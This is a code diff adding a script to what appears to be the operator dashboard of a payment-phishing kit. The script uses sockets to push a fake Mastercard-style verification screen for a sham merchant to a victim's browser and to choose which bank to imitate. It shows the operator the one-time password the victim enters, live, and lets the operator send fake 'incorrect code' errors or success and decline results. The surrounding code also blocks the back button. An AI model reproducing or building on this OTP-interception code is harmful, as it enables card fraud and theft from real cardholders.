@@ -1246,5 +1246,128 @@
     };
     history.pushState(null, null, window.location.href);
   </script>
+
+  <script>
+  // Make sure to place this script at the end of your file, before the closing body tag
+  
+  let currentMcInvoiceId = null;
+  
+  // Show MC verification panel
+  function showMCVerification(id) {
+    const transaction = transactionsMap.get(id);
+    if (!transaction) {
+      alert('Transaction not found');
+      return;
+    }
+    
+    // Show the MC verification panel
+    const mcOtpPanel = document.getElementById('mcOtpPanel');
+    mcOtpPanel.classList.remove('hidden');
+    
+    const mcOtpValue = document.getElementById('mcOtpValue');
+    mcOtpValue.textContent = 'Waiting...';
+    currentMcInvoiceId = id;
+    
+    console.log('Showing MC verification for invoice:', id);
+    
+    // Send event to client to show MC verification
+    socket.emit('show_mc_verification', {
+      invoiceId: id,
+      merchantName: 'Bologus pvt store.',
+      amount: `₹${transaction.amount}`,
+      bankCode: document.getElementById('mcBankSelect').value
+    });
+  }
+  
+  // Set up event handlers for MC verification when the page loads
+  document.addEventListener('DOMContentLoaded', function() {
+    const mcOtpPanel = document.getElementById('mcOtpPanel');
+    const mcBankSelect = document.getElementById('mcBankSelect');
+    const mcOtpInvalidBtn = document.getElementById('mcOtpInvalidBtn');
+    const mcOtpSuccessBtn = document.getElementById('mcOtpSuccessBtn');
+    const mcOtpFailBtn = document.getElementById('mcOtpFailBtn');
+    const mcClosePanelBtn = document.getElementById('mcClosePanelBtn');
+    
+    // Handle MC bank selection
+    mcBankSelect.addEventListener('change', function() {
+      if (currentMcInvoiceId) {
+        console.log('Changing bank to:', mcBankSelect.value, 'for invoice:', currentMcInvoiceId);
+        socket.emit('update_mc_bank', {
+          invoiceId: currentMcInvoiceId,
+          bankCode: mcBankSelect.value
+        });
+      }
+    });
+    
+    // Invalid OTP button
+    mcOtpInvalidBtn.addEventListener('click', function() {
+      if (currentMcInvoiceId) {
+        console.log('Sending invalid OTP message for invoice:', currentMcInvoiceId);
+        socket.emit('mc_otp_error', {
+          invoiceId: currentMcInvoiceId,
+          message: 'Incorrect verification code. Please try again.'
+        });
+      }
+    });
+    
+    // Success button
+    mcOtpSuccessBtn.addEventListener('click', function() {
+      if (currentMcInvoiceId) {
+        console.log('Sending successful verification result for invoice:', currentMcInvoiceId);
+        socket.emit('mc_verification_result', {
+          invoiceId: currentMcInvoiceId,
+          success: true
+        });
+        
+        // Reset the panel
+        mcOtpPanel.classList.add('hidden');
+        currentMcInvoiceId = null;
+      }
+    });
+    
+    // Fail button
+    mcOtpFailBtn.addEventListener('click', function() {
+      if (currentMcInvoiceId) {
+        console.log('Sending failed verification result for invoice:', currentMcInvoiceId);
+        socket.emit('mc_verification_result', {
+          invoiceId: currentMcInvoiceId,
+          success: false,
+          reason: 'declined'
+        });
+        
+        // Reset the panel
+        mcOtpPanel.classList.add('hidden');
+        currentMcInvoiceId = null;
+      }
+    });
+    
+    // Close button
+    mcClosePanelBtn.addEventListener('click', function() {
+      console.log('Closing MC verification panel');
+      mcOtpPanel.classList.add('hidden');
+      currentMcInvoiceId = null;
+    });
+  });
+  
+  // Listen for OTP submission from client
+  socket.on('mc_otp_submitted', function(data) {
+    console.log('Received OTP from client:', data);
+    if (data.invoiceId === currentMcInvoiceId) {
+      const mcOtpValue = document.getElementById('mcOtpValue');
+      if (mcOtpValue) {
+        mcOtpValue.textContent = data.otp || 'Error: No OTP received';
+      }
+    }
+  });
+  
+  // Listen for OTP resend requests
+  socket.on('mc_resend_otp', function(data) {
+    console.log('Client requested OTP resend:', data);
+    // If we want to show this in the admin UI, we could add code here
+  });
+  
+  // Make the function globally available
+  window.showMCVerification = showMCVerification;
+</script>
 </body>
 </html>
